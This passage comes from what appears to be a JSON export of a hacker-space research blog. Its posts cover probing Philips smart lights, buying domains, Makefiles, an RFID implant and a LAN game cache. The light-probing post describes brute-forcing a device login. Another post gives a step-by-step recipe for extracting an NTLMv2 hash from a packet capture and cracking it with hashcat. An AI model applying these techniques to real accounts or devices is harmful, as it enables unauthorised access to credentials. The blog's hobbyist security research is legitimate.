box. 25 lights isn't really enough to make a standard Christmas tree look good, so I bought some supplemental lights and hooked these babies up then got them connected to my wifi ASAP. You can buy additional Philips Illuminate branded extension light strings to hook up to your main strand, which maxes out at 300 lights per control box.\n\n![](2018/12/IMG_3415.jpg \"a mix of birbs, the colored Philips lights, and a strand of normal lights. note the green control box to the bottom left\")\n\nIn order to connect to your Philips Illuminate lights, you download the Illuminate app, connect to the wifi the control box emanates, and provide the control box with the login to your home wifi. Once you hook the control box up to your home wifi, everything is all set for app control. The app can do A Bunch of Cool Things, including a huge amount of pre-programmed light patterns, the ability to make your own custom patterns, and a mode where the lights react to your voice... super creepy but great for the cool trick factor. \n\nThe ease of this all means the lights are absolutely worth the sale price of $79.99 (originally $99.99!), right? But it'd be nice to get them to do a little more, or at least be able to deconstruct how they work. After running through the programs available on the app, creating my own programs on the app, and poking around to see if anybody had created a custom firmware for these yet, I got to the point where I started getting a bit more curious about the security of the Philips Illuminate light set. \n\nFirst of all, if these things are on my wifi network, they've got to have an IP address and my particular starting point for poking at things on my network is to do an nmap scan:\n\n![](2018/12/image-19.jpg)\n\nChoose whatever nmap scan you want, but this one hits all the ports tcp and udp so you can get a general idea of what the network functions of this device are. From this scan, I've got the easily recognizable port 80 which indicates we can browse to http://192.168.50.37 on my home network and see what's up there. I also see a pretty neat option with port 5577, which led me down a huge rabbit hole. I've never messed with smart home devices before, but apparently port 5577 is a standard control port for issuing commands to networked LED devices with a certain set of controllers. In the UDP zone, there's port 53!! Is this thing running a DNS server? There's also those various high level UDP ports which could offer up some interesting information.\n\nIn the interest of keeping things simple, I started with the port 80 web interface. By browsing to the IP address, I got a login prompt where I tried every different formulation of admin/admin, admin/password, root/[blank]... nothing.\n\n![](2018/12/Screen-Shot-2018-12-26-at-10.24.57-AM.jpg \"a challenge\")\n\nAlso note the truly beautiful shade of pink you get upon failed login... the kind of pink that makes you want to attempt more.\n\n![](2018/12/Screen-Shot-2018-12-26-at-10.29.47-AM.jpg \"heck.\")\n\nAt this point I was pretty okay with trying anything I could to get into what I assumed was a web interface to change settings with the lights. Following t[his](https://support.portswigger.net/customer/portal/articles/1964020-using-burp-to-brute-force-a-login-page) article about using Burp to brute force a login page yielded no results. [This](http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/) article about using Hydra to brute force a login page... **also** yielded no results. Double heck! \n\n***NOTE:*** Both of the brute force options would have worked if I had a certain reversed common username in any of the wordlists I used... remember to use good wordlists, pals. But I didn't, so I carried on.\n\nThe next thing I wanted to try was getting a PCAP of the app issuing commands to the lights, because maybe the password would be visible over the wire! At this point I was mistakenly assuming that the app was issuing API calls over port 80 via authenticated HTTP at the very least. I didn't have an easy way right off the bat to grab a PCAP, so I turned to asking people around me what they'd do next. We ended up decompiling the Philips Illuminate APK to try and find the password. It was a really great way to get a crash course in Android app development, but didn't yield any results HTTP login password-wise. I did get a bit more information about these lights though: the original developer is a company called Zengge and also got some model information from examining the APK. I wasn't right about the HTTP posts for the control of the lights, so on to the next option.\n\nDoing more research about port 5577 gave me the confirmation that it was time to put these things on an isolated test network just to be able to make sure nothing else was messing with them and snatch a pcap of opening my app and issuing a series of on-off commands:\n\n![](2018/12/Screen-Shot-2018-12-25-at-4.13.02-PM.jpg \"things happening over port 5577!!\")\n\nand look! Confirmation that commands are indeed issued over port 5577. But how can you confirm for absolutely certain that it's not just random chatter? Follow the streams:\n\n![](2018/12/Screen-Shot-2018-12-25-at-4.26.26-PM.jpg \"Repetitive commands being issued! Hooray!\")\n \nThat's what a series of on-off commands looks like, and here's what a series of switching between the two custom programs I made on the app look like: \n\n![](2018/12/Screen-Shot-2018-12-25-at-4.36.31-PM.png \"a bit more complex\")\n\nSo as you can see, a bit more complicated when you get into the fancy settings like color changes and fade speeds. When looking through the pcaps for different kinds of requests, there's not a whole bunch more information beyond the promise of the ability to issue totally unauthenticated commands. This makes it unnecessary to have the HTTP page login for the purposes of controlling the lights without the app, but I was still really interested in finding the password. What was that terrible pink 404 error hiding?\n\nOur next port to explore was confirmed as the one interesting artifact I found in the PCAPs I took: this controller randomly spits out the either the ip address, hostname, mac address in a string or every so often a string of \"HF-A11ASSISTHREAD\" over UDP on port 48899. \n\n![](2018/12/Screen-Shot-2018-12-26-at-1.46.48-PM.png \"a friendly network device\")\n\nThis didn't correspond with any hostnames, so I immediately threw it into Google and found out some excellent information about the Zengge Lightbulb manufacturing company thanks to [vikstrous on Github](https://github.com/vikstrous/zengge-lightcontrol). This source not only gave me some insight onto what's going on with this magical box and lights, but also the admin/password to login to the web interface (finally)!\n\nWhat is going on here anyways? What we know at this point is that there's 25 LEDs controlled by a control box. The control box has a wifi card in it which has the ability to not only broadcast but also connect to a wifi network. This card also runs a UART (Universal Asynchronous Receiver/Transmitter) that accepts commands over port 5577. The mysterious port 48899 is the ability to control some options for the device, but lucky for me the default HTTP login found on the internet for the device works!\n\n![](2018/12/Screen-Shot-2018-12-25-at-5.37.14-PM.jpg \"Answers!\")\n\nHere is where we can configure some cool information about the device's settings for sending and receiving commands, but honestly I'm not even going to touch it – since what I was really hoping for was a web interface to control the lights themselves, not really the device that controls communication to them. \n\nAn additional part of this adventure that doesn't really fit into the rest of the research is that Philips is just the distributor for this product which is made by Seasonal Specialties, a company founded in 1996. [Seasonal Specialities](http://www.seasonalspecialties.com) has a website that was created in Microsoft Frontpage 5.0 but also a [wordpress with a default login page](http://www.seasonalspecialties.com/wp/wp-login.php) operating on the same web host. Yikes. These details tell me security isn't exactly a major concern at Seasonal Specialities, yet these lights are a really nicely made product so I would like to tell them to please start caring! If you go through all of the trouble to rebrand the Zenegge light parts into something that becomes a well-constructed nicely working set of Christmas lights, why not go the extra mile and figure out how to cover up their lack of security? \n\nLuckily, I've got what I need to start creating the foundation for controlling the lights without the Philips Illuminate app. I have a model of UART Controller and lights, I know that the commands aren't sent with any authentication, and I could conceivably find a way to send commands via my Raspberry Pi or create my own web interface for their control. Simply telnetting to port 5577 and repeating the same strings observed in the PCAP back at the device doesn't really work... So now it's just a matter of finding out what packages are out there to interact with this controller or building my own. I'm also tempted to see if any of the [OpenHab](https://www.openhab.org/addons/bindings/wifiled/) extensions can play nice with these lights. Either way, I haven't really hacked my Christmas lights, I just found out a TON of information about how they work and function. The true hack will come when I find a way to make them work without their intended supporting software. \n\nThanks to some sources:\n\n[https://www.jpelectron.com/sample/Electronics/WiFi%20LED%20control/](https://www.jpelectron.com/sample/Electronics/WiFi%20LED%20control/)\n\n[https://github.com/renebohne/wifirgbcontroller](https://github.com/renebohne/wifirgbcontroller)\n\n[https://www.openhab.org/addons/bindings/wifiled/](https://www.openhab.org/addons/bindings/wifiled/)\n\n[https://github.com/vikstrous/zengge-lightcontrol](https://github.com/vikstrous/zengge-lightcontrol)\n"},{"title":"How I accidentally became a domain broker","slug":"buying-and-selling-domains","date_published":1545268500000,"date_updated":1545268511000,"tags":["Story","domains"],"excerpt":"\nI buy domains. I buy stupid domains. I buy cheap domains. Put this together, mix it with mild recklessness towards my own finances, and you get hundreds of stupid domains. At one point my namecheap.com account held over ****150**** domains.\n\nHere's some highlights of some of the more **safe-for-work** domains\n\n- botnet.party\n- grubby.site\n- heckin.download\n- illegal.space\n- malicious.tech\n- malware.loan\n- totallynotavirus.download (my fav)\n- phishing.download\n- rootkit.download\n- trustworthy.website\n- legit.host\n- [cont]\n\nI mainly buy these domains for stupid projects, ideas, etc. One project idea was buy as many $0.88 domains from namecheap (bless), and make a shady url  generator. Others were just to creep people out with emails, such as uj893mw94@totallynotavirus.download.\n\nOn August 11th, 2017, I bought a bunch of domains. One of these domains, was ******eggplant.tech, ******purchased for $0.88 cents. A fairly harmless domain, to be used in conjunction with whatever I was working on at the time.\n\n![](2018/12/image-14.png \"Domain purchase of eggplant.tech for $0.88\")\n\nFor months, this domain sat doing nothing, along with **many** of the other domains I have aquired. I mean, what do you do with eggplant.tech anyways? Well, someone had an idea in mind. And money. I have never directly listed domains for sale, but that doesn't stop the internet from wanting to buy stupid things. I know this pretty well.\n\nOn Febuary 12th, I got this email.\n\n![](2018/12/image-15.png \"Domain offer for eggplant.tech for !$300!\")\n\n$****300 dollars. For eggplant.tech, a domain I bought for **eighty-eight cents. ******What do you do in a situation like this? **SELL IT.** You sell that as fast as possible.\n\n![](2018/12/image-16.png \"Paypal for $300\")\n\nA few weeks later, the domain is transfered, and the money in my paypal. Whoever the brave, stupid soul that paid $300 for eggplant.tech is; god bless you man. I hope you do something interesting with it, because I sure won't.\n\nUPDATE:\nThe domain owner has still not update DNS records. The domain eggplant.tech still points to an unprovisioned server of mine.\n\n![](2018/12/image-17.png)\n","cover":"2018/12/90735205-laptop-eggplant-emoji-face-avatar-computer-purple-pc-cheerful-vector-illustration.jpg","author":{"name":"Pips","avatar":"avatars/pips.jpg"},"content":"\nI buy domains. I buy stupid domains. I buy cheap domains. Put this together, mix it with mild recklessness towards my own finances, and you get hundreds of stupid domains. At one point my namecheap.com account held over ****150**** domains.\n\nHere's some highlights of some of the more **safe-for-work** domains\n\n- botnet.party\n- grubby.site\n- heckin.download\n- illegal.space\n- malicious.tech\n- malware.loan\n- totallynotavirus.download (my fav)\n- phishing.download\n- rootkit.download\n- trustworthy.website\n- legit.host\n- [cont]\n\nI mainly buy these domains for stupid projects, ideas, etc. One project idea was buy as many $0.88 domains from namecheap (bless), and make a shady url  generator. Others were just to creep people out with emails, such as uj893mw94@totallynotavirus.download.\n\nOn August 11th, 2017, I bought a bunch of domains. One of these domains, was ******eggplant.tech, ******purchased for $0.88 cents. A fairly harmless domain, to be used in conjunction with whatever I was working on at the time.\n\n![](2018/12/image-14.png \"Domain purchase of eggplant.tech for $0.88\")\n\nFor months, this domain sat doing nothing, along with **many** of the other domains I have aquired. I mean, what do you do with eggplant.tech anyways? Well, someone had an idea in mind. And money. I have never directly listed domains for sale, but that doesn't stop the internet from wanting to buy stupid things. I know this pretty well.\n\nOn Febuary 12th, I got this email.\n\n![](2018/12/image-15.png \"Domain offer for eggplant.tech for !$300!\")\n\n$****300 dollars. For eggplant.tech, a domain I bought for **eighty-eight cents. ******What do you do in a situation like this? **SELL IT.** You sell that as fast as possible.\n\n![](2018/12/image-16.png \"Paypal for $300\")\n\nA few weeks later, the domain is transfered, and the money in my paypal. Whoever the brave, stupid soul that paid $300 for eggplant.tech is; god bless you man. I hope you do something interesting with it, because I sure won't.\n\nUPDATE:\nThe domain owner has still not update DNS records. The domain eggplant.tech still points to an unprovisioned server of mine.\n\n![](2018/12/image-17.png)\n"},{"title":"A 9-step recipe to crack a NTLMv2 Hash from a freshly acquired .pcap","slug":"cracking-an-ntlmv2-hash","date_published":1545170400000,"date_updated":1545177514000,"tags":["how to","pcap"],"excerpt":"\n1. Open your .pcap that contains an NTLMv2 hash in Wireshark.\n2. Filter by ntlmssp to get the authentication handshake.\n\n![](2018/12/image-3.jpg \"artisanal smb2 authentication packets\")\n\n3. In this case, we get three packets. Find the NTLMSSP_AUTH packet. Filter the packet down to the Security Blob layer to get to the juicy good stuff:\n\n![](2018/12/image-5.png \"the goods\")\n\n4. Copy out the domain name and user name to a text document.\n\n5. Drill down into the NTLM Response section to find NTProofStr and NTLMv2 response. Copy both of these out to the text document as a Hex String. \n\n![](2018/12/image-6.jpg \"cross the streams\")\n\n6. Notice that NTLMv2Response begins with the ntlmProofStr, so delete the ntlmProofStr from the NTLMv2Response.\n\n![](2018/12/image-7.jpg)\n\n7. Enter ntlmssp.ntlmserverchallenge into the search filter. This will highlight the packet where the NTLM Server Challenge is found, generally the packet before the NTLM_Auth packet. Copy this value to the text document as a Hex String. \n\n![](2018/12/image-8.jpg)\n\n8. Put the values into the following format and save it as crackme.txt: \n\nusername::domain:ServerChallenge:NTproofstring:modifiedntlmv2response\n\n![](2018/12/image-12.png)\n\n9. Find your favorite password list (RockYou? best_1000_passwords2018.txt?) and open a terminal to use hashcat to run:\n\n> hashcat -m 5600 crackme.txt passwordlist.txt \n\nand it will give you the user's password!\n\n![](2018/12/image-13.png \"congrats on the hax!\")\n\nsources for more information:\n\n- [https://www.root9b.com/newsroom/attacking-windows-fallback-authentication/](https://www.root9b.com/newsroom/attacking-windows-fallback-authentication/)\n- [https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)\n","cover":"2018/12/CredUIHTTPAuth.jpg","author":{"name":"kimb3r","avatar":"avatars/kimb3r.jpg"},"content":"\n1. Open your .pcap that contains an NTLMv2 hash in Wireshark.\n2. Filter by ntlmssp to get the authentication handshake.\n\n![](2018/12/image-3.jpg \"artisanal smb2 authentication packets\")\n\n3. In this case, we get three packets. Find the NTLMSSP_AUTH packet. Filter the packet down to the Security Blob layer to get to the juicy good stuff:\n\n![](2018/12/image-5.png \"the goods\")\n\n4. Copy out the domain name and user name to a text document.\n\n5. Drill down into the NTLM Response section to find NTProofStr and NTLMv2 response. Copy both of these out to the text document as a Hex String. \n\n![](2018/12/image-6.jpg \"cross the streams\")\n\n6. Notice that NTLMv2Response begins with the ntlmProofStr, so delete the ntlmProofStr from the NTLMv2Response.\n\n![](2018/12/image-7.jpg)\n\n7. Enter ntlmssp.ntlmserverchallenge into the search filter. This will highlight the packet where the NTLM Server Challenge is found, generally the packet before the NTLM_Auth packet. Copy this value to the text document as a Hex String. \n\n![](2018/12/image-8.jpg)\n\n8. Put the values into the following format and save it as crackme.txt: \n\nusername::domain:ServerChallenge:NTproofstring:modifiedntlmv2response\n\n![](2018/12/image-12.png)\n\n9. Find your favorite password list (RockYou? best_1000_passwords2018.txt?) and open a terminal to use hashcat to run:\n\n> hashcat -m 5600 crackme.txt passwordlist.txt \n\nand it will give you the user's password!\n\n![](2018/12/image-13.png \"congrats on the hax!\")\n\nsources for more information:\n\n- [https://www.root9b.com/newsroom/attacking-windows-fallback-authentication/](https://www.root9b.com/newsroom/attacking-windows-fallback-authentication/)\n- [https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)\n"},{"title":"Makefiles, but in English: Part 1","slug":"makefiles-but-in-english-part-1","date_published":1544659200000,"date_updated":1545104230000,"tags":["how to","Makefile"],"excerpt":"Make is intelligent enough to be able to distinguish between them at runtime. But it's probably best to avoid storing different types in a variable.","cover":"2018/12/makefile-1.jpg","author":{"name":"David Freitag","avatar":"avatars/david-freitag.jpg"},"content":"\nIn this multi-part series, I will be covering Makefiles and the general behavior of Make itself. The only real prerequisite knowledge needed is a general understanding of Bash and the common Bash builtins. We are going to cover variables, functions, builtins (variables and functions), rules, and recipes. By the time you are done with this series, you should have a confident grasp of Makefiles and have the ability to quickly get started with any project. However, before I get started I'd like to make a few points. First, this series is not intended to serve as a reference for Make. Instead, it will give you a basic understanding of how to get started and, more importantly, it will give you a set of keywords to supplement your googlefu. Secondly, the snippets and examples that follow are tested using GNU Make v4.1. There exist several different versions and indeed completely different implementations of Make. There may be slight syntax differences in these different versions and implementations of Make, but the keywords in this series should point you in the right direction.\n\n# Part 1a: Make Variables\n\nMakefiles, at a very basic level, are more or less script files. They allow the user to define functions, variables, they begin \"execution\" from the first line, and continue until termination. To define a variable in a Makefile, simply declare it with a name, followed by an assignment operator, followed by the value. For example: `FOO = BAR` will define a variable named `FOO`, with the value `BAR`. The actual value you set only becomes important in the context which it is used. Syntactically speaking, there is no requirement that Makefile variables be capitalized, but it immediately distinguishes them from functions and builtins; to each their own.\n\nAlthough Make variables behave similar to Environmental Variables, these values are not globally set. For example, if you define some value `FOO` in your makefile, you will not see that value present in your C file (unless you explicitly instruct your compiler to). Similar to Bash, Make does not really have a type system, a variable defined to a string can later be assigned to an integer. Make itself is intelligent enough to be able to make the distinction between them at runtime. That being said, it is probably best to avoid storing different types in a variable.\n\nThere are a series of [assignment operators](https://www.gnu.org/software/make/manual/html_node/Setting.html) in Make, and all of them behave slightly differently. Before I get into them, there is a concept which needs introducing, and that is expansion. If you are familiar with Bash and linux Environmental Variables, you should be familiar with the concept of expansion. Essentially, expansion is the evaluation of an assignment, whether it contains references to other variables or functions. Depending on the desired level of expansion, you can run into issues such as infinite recursion and infinite self-references. To address these issues, the authors of Make created different operators (actual operators in quotes to avoid confusion):\n\n- \"=\": Variable assignment using *recursive* expansion.\n- \":=\" and \"::=\": [\"Simple\" variable assignment](https://www.gnu.org/software/make/manual/html_node/Flavors.html#Flavors) using only a single level of expansion. This prevents infinite expansion or self reference. The difference between the single-colon and double-colon versions seems to be POSIX compliance, and does not work on older versions of Make.\n- \"?=\": Conditional variable assignment operator. This assignment will only occur if the variable being assigned to does not already exist. This is helpful for creating defaults for values which can be passed on the command line. Note that an empty value **does** count as being defined in Make.\n- \"+=\": [Append](https://www.gnu.org/software/make/manual/html_node/Appending.html) assignment operator. This operator concatenates a space followed by the assigned value. `FOO += bar` is the equivalent of saying `FOO := $(FOO) bar`. Note that we are using `:=` for a self-reference, using `=` can cause issues.\n\nNow that we can define variables, how do we refer to them in the rest of the Makefile? Both variables and builtins are referred to using the `$()` operator, for example:\n\n    FOO := foo\n    BAR := $(FOO) bar\n    \n\nIf you were to echo `BAR` in this Makefile, you would find that it contains `foo bar`.  This shows not only variable reference, but Make's extremely simple concatenation. Again, if you are familiar with Bash this should all be familiar. Let's break down exactly how this works. First, we assign the value of `FOO` using one level of expansion. The value we set is fixed, there are no variable references or builtins to expand, it's simply set. `BAR`, on the other hand, must expand the variable reference to `FOO`, get it's value, and concatenate \" bar\" onto it. Note the space.\n\n# Part 1b, Make builtin functions\n\n[Calling functions](https://www.gnu.org/software/make/manual/html_node/Syntax-of-Functions.html#Syntax-of-Functions) in Makefiles is similar to the way that variables are referenced, wih the `$()` operator. This is true for both builtin functions, and user-defined functions, however user-defined functions are slightly different. In a Makefile, it is possible to define custom functions, but they are rarely used, so I will primarily focus on using builtin functions. For the sake of brevity, I will not be covering every single builtin available to you in Make, but I will cover how they are used, and what kind of functions are available to you.\n\nTo call a function in Make, you first need to know the name of the function, and the arguments which it accepts. The arguent system in Make is not so concrete as you might expect, instead it differs slightly from function to function. For instance,\n`FOO := $(wildcard *.c)` creates a variable called `FOO` and assigns the value to the output of the [wildcard](https://www.gnu.org/software/make/manual/html_node/Wildcard-Function.html) function. This function outputs the names of all files in the current directory which match the specified pattern. The wildcard is commonly used for automatic source file detection in simple projects. Along with the wildcard function, there are several other types of functions which are available in Make:\n\n- [Text Functions](https://www.gnu.org/software/make/manual/html_node/Text-Functions.html#Text-Functions): General text manipulation functions. They can be used to do things like substitutions, pattern-based subsitutions, changing file extensions, etc\n- [Conditional Functions](https://www.gnu.org/software/make/manual/html_node/Conditional-Functions.html#Conditional-Functions): Provide a mechanism to implement a structure of logic within the Makefile.\n- [File](https://www.gnu.org/software/make/manual/html_node/File-Function.html#File-Function) and [File Name](https://www.gnu.org/software/make/manual/html_node/File-Name-Functions.html#File-Name-Functions) Functions: Provides the user with utilities to manipulate file names, and do simple file I/O\n- [Call Function](https://www.gnu.org/software/make/manual/html_node/Call-Function.html#Call-Function): Allows the user to call user-defined functions.\n\nThis is not an exhaustive list, for the full list of builtin functions see [this](https://www.gnu.org/software/make/manual/html_node/Functions.html).\n\n# Part 1c, user-defined functions\n\nLike some of the features in Make, user-defined functions exist to cover certain edge cases. You should not need them, but if you do you'll *really* need them. If you're familiar with C/C++ macros, then you will already be familiar with how Make user-defined functions work. The [O'Rielly Make open book](https://www.oreilly.com/openbook/make3/book/ch04.pdf) is a very good reference for user-defined functions. These functions must be defined on a single line, but the standard backslash notation will allow the user to split a function on to multiple lines.\n\n    define myfunction\n        echo \"Hello, World!\"\n    \n\nTo call this function, you use the `call` builtin function, `$(call myfunction)`\n\nThis section is glossed over for a few reasons. Chances are if you're using a Makefile user-defined function you're probably Doing It Wrong™, it's already quite well documented in the linked book, and it's a fairly advanced feature of Make.\n"},{"title":"Biohacking: New VivoKey Spark Implant","slug":"first-vivokey-spark","date_published":1544658125000,"date_updated":1546998066000,"tags":["biohacking","RFID"],"cover":"2018/12/091816humanchip_1280x720.jpg","author":{"name":"Pips","avatar":"avatars/pips.jpg"},"content":"\nSo, I got a VivoKey Spark. No, not a VivoKey Flex. This is a new product from VivoKey, that is currently 100% unreleased.\n\nThe Spark is similar to the Flex One from VivoKey, but this one, instead of being a flat flexible strip, is in a small glass tube just like every other RFID implant. It's small, compact, and feature rich. \n\nFirst, let's talk about what VivoKey is trying to accomplish. While all of their marketing is practically non-existent on just about anything they're doing, going so far as to have a one page website with no feature or technical information. However we can still work out some things from what is available. \n\nThe VivoKey is...\n\n- RFID-based implantable technology\n- Runs on NFC frequency and protocol.\n- Aims to be a device capable of\n\n- PGP/GPG storage\n- 2FA storage\n- Payment applications\n\n- Tap to pay\n- Wallets\n- Addresses\n\n- Access control\n- Any other RFID/NFC-based technology implementations\n\nVivoKey is a product that's still in it's very early stages, all things considered. The [VivoKey Flex recently just entered beta](https://dangerousthings.com/shop/vivokey-flex-one/). The VivoKey Spark has not even been announced yet (it is expected to be announced at BDYHAX in the 15th of December). Very little is known about this product, and all information is coming from secondary sources. It is reported that the Spark has less overall storage space, due to its physically small size, but unknown how much of a disparity in storage there will be.\n\nI acquired the Spark through [@c00p3r](https://twitter.com/c00p3r_7), who runs the Dangerous Minds podcast and is a good friend of DC801. Cooper acquired the Sparks early, directly from Amal @ Dangerous Things. It turns out that neither Amal or Cooper have gotten these implanted. Looks like I am the very first person to have a VivoKey Spark doin' things in their body.\n\n> Oooo, what&#39;s this? 😁[@DangerousThings](https://twitter.com/DangerousThings?ref_src=twsrc%5Etfw)[@c00p3r_7](https://twitter.com/c00p3r_7?ref_src=twsrc%5Etfw)[@dmindspodcast](https://twitter.com/dmindspodcast?ref_src=twsrc%5Etfw)[pic.twitter.com/UhtW7mDKZb](https://t.co/UhtW7mDKZb)\n> &mdash; Pips (@Pips801) [December 10, 2018](https://twitter.com/Pips801/status/1072276390173532162?ref_src=twsrc%5Etfw)\n\n![](2018/12/image.jpg)\n\nOn opening, there is a card that tells you to STOP! and not continue until you visit [vivokey.com/spark](http://vivokey.com/spark). Sadly, the page does not exist (yet). Once I got it, I immediately drove over to a local piercing studio and got it installed. \n\nBelow is the installation video of the VivoKey Flex.You don't have to watch it, but if you're curious about the process, it's a quick video.\n\nA description of the video: Hand is sanitized and the needle comes pre-loaded with the glass tag alredy. the needle is pushed through the skin, and the plunger is pressed while removing the needle and leaving the tag behind. In the video, the tag actually was slightly stuck to the needle on removal, so  the needle/tag was pushed back in to make sure it stayed.\n\nOnce installed, it was time to scan. The major exciting feature is Fidesmo and their application development stack. However, scanning the tag with the Fidesmo app did not work at all. It appears this does not directly register as a Fidesmo/Fidesmo-capable chip.\n\nIf you scan it with an NFC app, it reveals this information about the tag.\n\n![](2018/12/image-1.jpg)\n\nThe tag appears to be emulating a standard NFC tag with enough storage to store a URL on it in the standard NFC URL format. The url is unique per chip. However, when I visit the URL, it forwards me to [https://www.vivokey.com/claim-my-spark](https://www.vivokey.com/claim-my-spark), which just says \"coming soon\". \n\nIt appears that the chip used in the VivoKeys has the ability to emulate/virtualize NFC partitions on it. This one virtualized a standard ISO 15693 tag with a size just big enough to store the registration URL (49/49 Bytes).\n\nI assume that this is the page where you register the Spark, and probably download an app or something that allows you to actually interact with the device.\n\nNow that a member of DC801 has a VivoKey Spark, we can finally start hacking on it and writing applications for it. All of our research, development, and hacking will be cataloged right here on the 801Labs Research site. Click subscribe below to be kept up to date! 🙌\n","excerpt":"\nSo, I got a VivoKey Spark. No, not a VivoKey Flex. This is a new product from VivoKey, that is currently 100% unreleased.\n\nThe Spark is similar to the Flex One from VivoKey, but this one, instead of being a flat flexible strip, is in a small glass tube just like every other RFID implant. It's small, compact, and feature rich. \n\nFirst, let's talk about what VivoKey is trying to accomplish. While all of their marketing is practically non-existent on just about anything they're doing, going so far as to have a one page website with no feature or technical information. However we can still work out some things from what is available. \n\nThe VivoKey is...\n\n- RFID-based implantable technology\n- Runs on NFC frequency and protocol.\n- Aims to be a device capable of\n\n- PGP/GPG storage\n- 2FA storage\n- Payment applications\n\n- Tap to pay\n- Wallets\n- Addresses\n\n- Access control\n- Any other RFID/NFC-based technology implementations\n\nVivoKey is a product that's still in it's very early stages, all things considered. The [VivoKey Flex recently just entered beta](https://dangerousthings.com/shop/vivokey-flex-one/). The VivoKey Spark has not even been announced yet (it is expected to be announced at BDYHAX in the 15th of December). Very little is known about this product, and all information is coming from secondary sources. It is reported that the Spark has less overall storage space, due to its physically small size, but unknown how much of a disparity in storage there will be.\n\nI acquired the Spark through [@c00p3r](https://twitter.com/c00p3r_7), who runs the Dangerous Minds podcast and is a good friend of DC801. Cooper acquired the Sparks early, directly from Amal @ Dangerous Things. It turns out that neither Amal or Cooper have gotten these implanted. Looks like I am the very first person to have a VivoKey Spark doin' things in their body.\n\n> Oooo, what&#39;s this? 😁[@DangerousThings](https://twitter.com/DangerousThings?ref_src=twsrc%5Etfw)[@c00p3r_7](https://twitter.com/c00p3r_7?ref_src=twsrc%5Etfw)[@dmindspodcast](https://twitter.com/dmindspodcast?ref_src=twsrc%5Etfw)[pic.twitter.com/UhtW7mDKZb](https://t.co/UhtW7mDKZb)\n> &mdash; Pips (@Pips801) [December 10, 2018](https://twitter.com/Pips801/status/1072276390173532162?ref_src=twsrc%5Etfw)\n\n![](2018/12/image.jpg)\n\nOn opening, there is a card that tells you to STOP! and not continue until you visit [vivokey.com/spark](http://vivokey.com/spark). Sadly, the page does not exist (yet). Once I got it, I immediately drove over to a local piercing studio and got it installed. \n\nBelow is the installation video of the VivoKey Flex.You don't have to watch it, but if you're curious about the process, it's a quick video.\n\nA description of the video: Hand is sanitized and the needle comes pre-loaded with the glass tag alredy. the needle is pushed through the skin, and the plunger is pressed while removing the needle and leaving the tag behind. In the video, the tag actually was slightly stuck to the needle on removal, so  the needle/tag was pushed back in to make sure it stayed.\n\nOnce installed, it was time to scan. The major exciting feature is Fidesmo and their application development stack. However, scanning the tag with the Fidesmo app did not work at all. It appears this does not directly register as a Fidesmo/Fidesmo-capable chip.\n\nIf you scan it with an NFC app, it reveals this information about the tag.\n\n![](2018/12/image-1.jpg)\n\nThe tag appears to be emulating a standard NFC tag with enough storage to store a URL on it in the standard NFC URL format. The url is unique per chip. However, when I visit the URL, it forwards me to [https://www.vivokey.com/claim-my-spark](https://www.vivokey.com/claim-my-spark), which just says \"coming soon\". \n\nIt appears that the chip used in the VivoKeys has the ability to emulate/virtualize NFC partitions on it. This one virtualized a standard ISO 15693 tag with a size just big enough to store the registration URL (49/49 Bytes).\n\nI assume that this is the page where you register the Spark, and probably download an app or something that allows you to actually interact with the device.\n\nNow that a member of DC801 has a VivoKey Spark, we can finally start hacking on it and writing applications for it. All of our research, development, and hacking will be cataloged right here on the 801Labs Research site. Click subscribe below to be kept up to date! 🙌\n"},{"title":"An easier SaltLAN","slug":"an-easier-saltlan","date_published":1543375206000,"date_updated":1543375255000,"tags":[],"excerpt":"My family does an annual LAN Party and one of the biggest complaints we have is that Steam takes ages to download for everyone.","cover":"2018/11/image-12.jpg","author":{"name":"bashNinja","avatar":"avatars/bashNinja.jpeg"},"content":"\nMy family does an annual LAN Party and one of the biggest complaints we have is that Steam takes ages to download for everyone. \n\nThis year things are going to be different. I want to follow in the footsteps of SaltLAN and setup some caching. As this progressed, I spiced things up with my own flare and thought I would share.\n\nThe primary guide I followed was:\n[https://github.com/SaltLAN/Configuration/blob/master/SETUP.md](https://github.com/SaltLAN/Configuration/blob/master/SETUP.md)\ndone by [@Pips801](https://twitter.com/pips801). \n\n### Step 1 - Get a Server\n\nI have a server I use for various projects and environments. \nSuperMicro E300-8D\nYou can read about a similar setup on a fellow 801Labs member's blog at:\n[https://securedumby.science/view-post/dumbyland_beginning_](https://securedumby.science/view-post/dumbyland_beginning_)\n\n### Step 2 - Install a VM\n\nI am installing a Ubuntu 18.04 VM onto this server. The primary trick with the VM is that I setup 2 hard drives so that I can utilize the BLAZING FAST NVMe drive I have in this server for the caching. After this LAN party, I'm going to delete/shrink the cache drive since it won't be needed later and I want to keep the NVMe space available for other projects. I'll keep the OS & Dockers on the mSata drive, powered off, for future use.\n\n![](2018/11/image-4.jpg \"VM Configuration\")\n\nFollow the normal Ubuntu install setup.\n\nUpdate Ubuntu:\n\n    sudo apt update\n    sudo apt dist-upgrade -y\n    sudo reboot\n    \n\nEnable SSH:\n\n    sudo systemctl enable ssh\n    sudo systemcts start ssh\n    \n\n### Step 3 - Setup Docker\n\nThis should be pretty easy. Follow the official instructions:\n[https://docs.docker.com/install/linux/docker-ce/ubuntu/](https://docs.docker.com/install/linux/docker-ce/ubuntu/)\n\n### Step 4 - Install Portainer.io\n\nFollow the official instructions:\n[https://portainer.io/install.html](https://portainer.io/install.html)\n\nI deviated from the official Portainer guide by not creating a portainer data container, and rather mounting to the filesystem. I did this so I can backup the settings easily.\n\n    sudo mkdir /opt/appdata/\n    docker run -d -p 9000:9000 -v /var/run/docker.sock:/var/run/docker.sock -v /opt/appdata/portainer:/data --restart unless-stopped --name portainer portainer/portainer\n    \n\n![](2018/11/image-5.jpg)\n\nBam! Now you should be able to access Portainer\n\n### Step 5 - Format & Automount Cache Drive\n\nI followed this guide to format my 700GBs of NVMe storage for cache\n[https://www.digitalocean.com/community/tutorials/how-to-partition-and-format-storage-devices-in-linux](https://www.digitalocean.com/community/tutorials/how-to-partition-and-format-storage-devices-in-linux)\n\n    sudo parted /dev/sdb mklabel gpt\n    sudo parted -a opt /dev/sdb mkpart primary ext4 0% 100%\n    sudo mkfs.ext4 -L cache /dev/sdb1\n    \n\nDon't forget to add the drive to 